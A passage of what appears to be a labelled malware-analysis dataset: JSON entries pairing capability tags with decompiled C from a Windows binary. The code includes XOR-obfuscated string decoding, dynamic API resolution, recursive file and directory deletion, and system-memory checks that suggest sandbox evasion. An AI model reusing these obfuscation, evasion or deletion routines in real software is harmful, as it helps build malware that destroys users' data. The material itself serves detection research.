hFindFile;\n                    pcVar1 = puVar8 + hFindFile;\n                    cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_38h + iVar12 % 6);\n                    uVar3 = pcVar1[var_2ch];\n                    cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    hFindFile = hFindFile + 1;\n                    *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                } while (hFindFile < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpString1, puVar8);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_18h, lpString2);\n                var_4ch = 0x535f5a13;\n                var_48h = 0x5a65387a;\n                var_44h._0_2_ = 0x5375;\n                var_38h = 0x53755a4f;\n                var_34h._0_2_ = 0x3854;\n                fcn.0040a1e8(extraout_ECX);\n                var_2ch = &var_4ch - var_3ch;\n                hFindFile = 0;\n                do {\n                    iVar12 = hFindFile;\n                    pcVar1 = var_3ch + hFindFile;\n                    cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_38h + iVar12 % 6);\n                    uVar3 = pcVar1[var_2ch];\n                    cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar12 = var_18h;\n                    hFindFile = hFindFile + 1;\n                    *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                } while (hFindFile < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_18h, var_3ch);\n                puVar11 = lpFindFileData;\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, lpFindFileData);\n                puVar8 = var_20h;\n                pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_8h = 3;\n                    fcn.0040a1b7();\n                    uVar9 = 0;\n                    do {\n                        *(puVar8 + uVar9) = *(puVar8 + uVar9) * -100;\n                        pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar9 = uVar9 + 1;\n                    } while (uVar9 < 9);\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n                    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n                }\n                else {\n                    var_8h = 0;\n                    var_20h = puVar11 + 0x2c;\n                    do {\n                        if (*var_20h != 0x2e) {\n                            iVar12 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_20h);\n                            uVar9 = var_24h + 2 + iVar12;\n                            var_2ch = uVar9;\n                            if (var_28h < uVar9) {\n                                uVar6 = (*pcVar10)(0, lpString1);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                                uVar6 = (*pcVar10)(8, uVar9 * 2);\n                                iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n                                lpString1 = iVar12;\n                                if (iVar12 == 0) {\n                                    var_8h = 8;\n                                    break;\n                                }\n                                var_28h = var_2ch;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar12, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, puVar8);\n                            }\n                            else {\n                                *(lpString1 + 2 + var_24h * 2) = 0;\n                                iVar12 = lpString1;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, var_20h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar12 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(iVar12);\n                            }\n                            else {\n                                var_8h = fcn.00409dd7(arg_8h);\n                                if (var_8h != 0) break;\n                                iVar12 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(iVar12);\n                            }\n                            if ((iVar12 == 0) && (arg_8h == 0)) {\n                                var_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar12 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar12 != 0);\n                    fcn.0040a1b7();\n                    uVar9 = 0;\n                    do {\n                        *(puVar8 + uVar9) = *(puVar8 + uVar9) * -100;\n                        pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar9 = uVar9 + 1;\n                    } while (uVar9 < 9);\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n                    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n                    puVar11 = lpFindFileData;\n                }\n                uVar6 = (*pcVar10)(0, puVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                iVar7 = lpString1;\n                iVar12 = var_8h;\n            }\n            uVar6 = (*pcVar10)(0, var_18h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        }\n        if (iVar7 != 0) {\n            uVar6 = (*pcVar10)(0, iVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        }\n    }\n    if (var_30h != 0) {\n        uVar6 = (*pcVar10)(0, var_30h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    }\n    return iVar12;\n}\n",
        "token_count": 2275
    },
    "0040a52c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a52c(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.0040a465();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 288
    },
    "0040e0cf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e0cf(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.0040f176();\n    if (iVar2 == 0) {\n        iVar2 = fcn.0040d802(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.0040d888(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x4279e4 & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.0040df50();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.0040df50();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 541
    },
    "00411690": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411690(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x427bb4 = 1;\n    fcn.00407527(param_1);\n    fcn.00410d6e();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x4279dc);\n    if (iVar1 != -1) {\n        fcn.0040a12c();\n    }\n    fcn.0041116c();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.0041106c();\n    return;\n}\n",
        "token_count": 138
    },
    "0040144b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040144b(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    char cVar5;\n    char cVar6;\n    int16_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    code *pcVar10;\n    code *pcVar11;\n    int32_t iVar12;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint lpModuleName;\n    \n    var_40h = 0xb07363b;\n    var_3ch = 0x47603c0a;\n    var_38h = 0x3f3c0b4b;\n    var_34h = CONCAT31(var_34h._1_3_, 0x75);\n    var_28h = 0x65755350;\n    var_24h._0_1_ = 0x6f;\n    var_8h = param_1;\n    fcn.004034a8(param_1);\n    iVar12 = 0;\n    do {\n        fcn.004034cf(iVar12, *(&var_28h + iVar12 % 5) ^ *(&var_40h + iVar12));\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0xd);\n    var_3ch = 0xc02250b;\n    var_18h = 1;\n    var_38h = 0x1233970;\n    var_34h = CONCAT22(var_34h._2_2_, 0x3129);\n    var_28h = 0x686c4c4d;\n    var_24h._0_1_ = 0x31;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n    var_ch = 0;\n    *puVar9 = 0;\n    puVar9[1] = 0;\n    *(puVar9 + 2) = 0;\n    *(puVar9 + 10) = 0;\n    var_10h = &var_3ch - puVar9;\n    var_14h = puVar9;\n    do {\n        iVar12 = var_ch;\n        pcVar1 = var_ch + puVar9;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_28h + iVar12 % 5);\n        uVar3 = pcVar1[var_10h];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_ch < 10);\n    var_40h = 0x155e1e0f;\n    var_3ch = 0x1b0e0017;\n    var_38h = 0x1837135f;\n    var_34h = 0x77701f27;\n    var_20h = 0x77317248;\n    var_1ch._0_2_ = 0x6c76;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n    var_ch = 0;\n    *puVar9 = 0;\n    puVar9[1] = 0;\n    puVar9[2] = 0;\n    puVar9[3] = 0;\n    *(puVar9 + 4) = 0;\n    var_10h = &var_40h - puVar9;\n    var_28h = puVar9;\n    do {\n        iVar12 = var_ch;\n        pcVar1 = var_ch + puVar9;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_20h + iVar12 % 6);\n        uVar3 = pcVar1[var_10h];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        pcVar10 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    } while (var_ch < 0x10);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar9);\n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    var_10h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n    puVar9 = var_14h;\n    uVar8 = (*pcVar10)(lpModuleName, var_14h);\n    pcVar10 = (*pcVar11)(uVar8);\n    uVar8 = var_8h;\n    iVar7 = (*pcVar10)(var_8h);\n    if (iVar7 == 0) {\n        iVar7 = (*var_10h)(uVar8);\n        if (iVar7 == 0) {\n            var_40h = 0x2c2d0124;\n            var_3ch = 0x9221811;\n            var_38h = 0x1b040f26;\n            var_34h = var_34h & 0xff000000 | 0x422c0e;\n            var_30h = 0x4e426d63;\n            var_2ch._0_2_ = 0x7470;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n            var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n            var_ch = 0;\n            *var_10h = 0;\n            var_10h[1] = 0;\n            var_10h[2] = 0;\n            var_10h[3] = 0;\n            pcVar10 = _sym.imp.KERNEL32.dll_GetLastError;\n            var_20h = &var_40h - var_10h;\n            do {\n                iVar12 = var_ch;\n                pcVar1 = var_ch + var_10h;\n                cVar5 = (*pcVar10)();\n                uVar2 = *(&var_30h + iVar12 % 6);\n                uVar3 = pcVar1[var_20h];\n                cVar6 = (*pcVar10)();\n                var_ch = var_ch + 1;\n                *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n            } while (var_ch < 0xf);\n            var_3ch = 0x2a311304;\n            var_38h = 0x36285f18;\n            var_34h = CONCAT31(var_34h._1_3_, 0x55);\n            var_30h = 0x6b557745;\n            var_2ch._0_2_ = 0x306c;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n            puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n            var_ch = 0;\n            *puVar9 = 0;\n            puVar9[1] = 0;\n            *(puVar9 + 2) = 0;\n            var_20h = &var_3ch - puVar9;\n            do {\n                iVar12 = var_ch;\n                pcVar1 = var_ch + puVar9;\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_30h + iVar12 % 6);\n                uVar3 = pcVar1[var_20h];\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_ch = var_ch + 1;\n                *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n            } while (var_ch < 9);\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar9);\n            pcVar10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n            puVar4 = var_10h;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, var_10h);\n            pcVar11 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n            (*pcVar11)(var_8h);\n            (*pcVar10)(var_8h);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            uVar8 = (*pcVar10)(0, puVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            puVar9 = var_14h;\n            goto code_r0x0040176b;\n        }\n    }\n    var_18h = 0;\n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\ncode_r0x0040176b:\n    uVar8 = (*pcVar10)(0, var_28h);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n    uVar8 = (*pcVar10)(0, puVar9);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar8 = (*pcVar10)(0, lpModuleName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    return var_18h;\n}\n",
        "token_count": 2327
    },
    "00406884": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406884(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    code *pcVar9;\n    int32_t iVar10;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar var_29h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint lpModuleName;\n    \n    var_ch = 0;\n    var_20h = 0x41d123d;\n    puVar8 = &var_28h;\n    for (iVar10 = 8; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_1ch = 0xa37601c;\n    var_18h._0_2_ = 0x6815;\n    var_14h = 0x68796653;\n    var_10h._0_2_ = 0x4e70;\n    fcn.0040826e(0);\n    iVar10 = 0;\n    do {\n        fcn.004034cf(iVar10, *(&var_14h + iVar10 % 6) ^ *(&var_20h + iVar10));\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 10);\n    var_38h = 0x3a082c25;\n    var_34h = 0x2d07032a;\n    var_30h._0_2_ = 0x1c10;\n    var_30h._2_1_ = 6;\n    stack0xffffffcf = 0x566b141c;\n    var_29h = 0x79;\n    var_1ch = 0x79645877;\n    var_18h._0_2_ = 0x6e45;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    var_8h = 0;\n    *puVar8 = 0;\n    puVar8[1] = 0;\n    puVar8[2] = 0;\n    puVar8[3] = 0;\n    *(puVar8 + 4) = 0;\n    var_14h = &var_38h - puVar8;\n    do {\n        iVar10 = var_8h;\n        pcVar1 = var_8h + puVar8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_1ch + iVar10 % 6);\n        uVar3 = pcVar1[var_14h];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_8h = var_8h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_8h < 0x10);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar8);\n    pcVar9 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar7);\n    cVar5 = fcn.0040fcdb();\n    if (cVar5 != '\\0') {\n        var_ch = (*pcVar9)(0, var_24h, var_28h);\n    }\n    fcn.0041016b();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar7 = (*pcVar4)(0, lpModuleName);\n    (*pcVar9)(uVar7);\n    return var_ch;\n}\n",
        "token_count": 994
    },
    "00406dcb": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406dcb(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    fcn.0040aee0();\n    uVar6 = fcn.0040aee0();\n    iVar7 = fcn.004069d3(uVar6 & 0xff, 0x427964, 0x427968, &var_4h);\n    if ((((iVar7 != 0) && (iVar7 = fcn.004069d3(0, 0x427964, 0x427978, &var_4h),  iVar7 != 0)) &&\n        (iVar7 = fcn.004069d3(0, 0x427964, 0x42797c, &var_4h),  iVar7 != 0)) &&\n       (iVar7 = fcn.004069d3(0, 0x427964, 0x427980, &var_4h),  iVar7 != 0)) {\n        var_24h = 0x64267657;\n        var_20h = 0x761c5648;\n        var_1ch._0_2_ = 0x6443;\n        var_18h = 0x64437679;\n        var_14h._0_2_ = 0x5630;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n        puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        uVar6 = 0;\n        do {\n            *(puVar9 + uVar6) = *(puVar9 + uVar6) ^ 100;\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < 0x15);\n        var_8h = 0;\n        *puVar9 = 0;\n        puVar9[1] = 0;\n        puVar9[2] = 0;\n        puVar9[3] = 0;\n        puVar9[4] = 0;\n        *(puVar9 + 5) = 0;\n        var_10h = &var_24h - puVar9;\n        do {\n            iVar7 = var_8h;\n            pcVar1 = puVar9 + var_8h;\n            cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_18h + iVar7 % 6);\n            uVar3 = pcVar1[var_10h];\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_8h = var_8h + 1;\n            *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n        } while (var_8h < 10);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x427978, puVar9);\n        iVar7 = fcn.004069d3(0, 0x427964, 0x42796c, &var_4h);\n        if (iVar7 == 0) {\n            uVar6 = 0;\n            do {\n                *(puVar9 + uVar6) = *(puVar9 + uVar6) + '_';\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < 0x15);\n        }\n        else {\n            var_10h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            iVar7 = fcn.004069d3(0, &var_10h, 0x427984, &var_4h);\n            uVar6 = 0;\n            if (iVar7 == 0) {\n                do {\n                    *(puVar9 + uVar6) = *(puVar9 + uVar6) + '_';\n                    uVar6 = uVar6 + 1;\n                } while (uVar6 < 0x15);\n            }\n            else {\n                var_ch = 1;\n                do {\n                    *(puVar9 + uVar6) = *(puVar9 + uVar6) + '_';\n                    uVar6 = uVar6 + 1;\n                } while (uVar6 < 0x15);\n            }\n        }\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return var_ch;\n}\n",
        "token_count": 1124
    },
    "00406fa3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406fa3(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    code *pcVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    code *pcVar15;\n    uint pszFirst;\n    uint lpSystemInfo;\n    uint lpBuffer;\n    uint32_t var_100h;\n    int32_t var_fch;\n    uint var_c8h;\n    uint lpcbData;\n    uint namelen;\n    uint lpModuleName;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    ushort var_9ch;\n    uint var_9ah;\n    uint var_95h;\n    uint var_91h;\n    uint var_8dh;\n    uint var_89h;\n    uint var_85h;\n    uint var_81h;\n    uint var_7dh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint *var_30h;\n    int32_t name;\n    uint *var_28h;\n    int32_t lpValueName;\n    uint var_20h;\n    uint var_1ch;\n    uchar var_18h;\n    uint var_17h;\n    uint32_t var_13h;\n    uint var_fh;\n    uchar uStack15;\n    ushort uStack14;\n    code *var_8h;\n    uint var_4h;\n    \n    lpcbData = 0x200;\n    _var_18h = 0xb073600;\n    stack0xffffffe8 = 0x47603c0a;\n    stack0xffffffec = 0x4b;\n    puVar9 = &pszFirst;\n    for (iVar11 = 0x400; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    stack0xffffffec = stack0xffffffec & 0xff | 0x3f3c0b00;\n    var_fh._3_1_ = 0x75;\n    puVar9 = &lpBuffer;\n    for (iVar11 = 0x40; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_8h = 0x65755350;\n    puVar9 = &lpSystemInfo;\n    for (iVar11 = 0x24; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_c8h = 0x3b;\n    _var_18h = _var_18h & 0xffffff00 | 0x3b;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6f);\n    fcn.004034a8(0);\n    iVar11 = 0;\n    do {\n        fcn.004034cf(iVar11, *(&var_8h + iVar11 % 5) ^ (&var_18h)[iVar11]);\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xd);\n    var_1ch = 0x36405032;\n    _var_18h = 0x431c0e1b;\n    stack0xffffffe8 = 0x9032b51;\n    stack0xffffffec = 0x31595001;\n    var_fh._3_1_ = 0x14;\n    uStack15 = 0x1c;\n    uStack14 = 0x351a;\n    var_8h = 0x78343575;\n    var_4h._0_2_ = 0x7a7a;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n    name = 0;\n    *puVar9 = 0;\n    puVar9[1] = 0;\n    puVar9[2] = 0;\n    puVar9[3] = 0;\n    puVar9[4] = 0;\n    *(puVar9 + 5) = 0;\n    lpValueName = &var_1ch - puVar9;\n    var_30h = puVar9;\n    do {\n        iVar11 = name;\n        pcVar1 = name + puVar9;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar11 % 6);\n        uVar3 = pcVar1[lpValueName];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        name = name + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n    } while (name < 0x14);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar9);\n    var_8h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n    lpBuffer = 0x40;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)(&lpBuffer);\n    var_9ah._0_1_ = 0x3b;\n    var_b8h = 0x38395723;\n    var_b4h = 0x570f531d;\n    var_b0h = 0x530e382f;\n    var_ach = 0x383d5719;\n    var_a8h = 0x572f5333;\n    var_a4h = 0x533c381d;\n    var_a0h = 0x380a5728;\n    var_9ch = 0x5326;\n    stack0xffffff63 = 0x26380c57;\n    var_95h = 0x16572453;\n    var_91h = 0x38533338;\n    var_8dh = 0x1c382157;\n    var_89h = 0x3d571f53;\n    var_85h = 0x37530238;\n    var_81h = 0xa381b57;\n    var_7dh._0_1_ = 0x53;\n    var_7dh._1_1_ = 5;\n    stack0xffffff81 = 0x1d382c57;\n    var_77h = 0x34570a53;\n    var_73h = 0x19533f38;\n    var_6fh = 0xc383757;\n    var_6bh = 0x2b570e53;\n    var_67h = 0x4531c38;\n    var_63h = 0x33382a57;\n    var_5fh = 0x58575b53;\n    var_5bh._0_1_ = 0x38;\n    stack0xffffffec = 0x3858576b;\n    var_fh._3_1_ = 0x6f;\n    uStack15 = 0x53;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xbd);\n    iVar11 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n    uVar10 = 0;\n    do {\n        *(iVar11 + uVar10) = *(iVar11 + uVar10) ^ 0x14;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0xbd);\n    name = iVar11;\n    sub.ntdll.dll_memset(iVar11, 0, 0xbd);\n    var_28h = NULL;\n    iVar14 = iVar11;\n    lpValueName = &var_b8h - iVar11;\n    do {\n        pcVar1 = iVar14 + var_28h;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_13h + var_28h % 6 + 3);\n        uVar3 = pcVar1[&var_b8h - iVar11];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_28h = var_28h + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n        iVar14 = name;\n    } while (var_28h < 0x5e);\n    if (var_8h == NULL) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n    }\n    else {\n        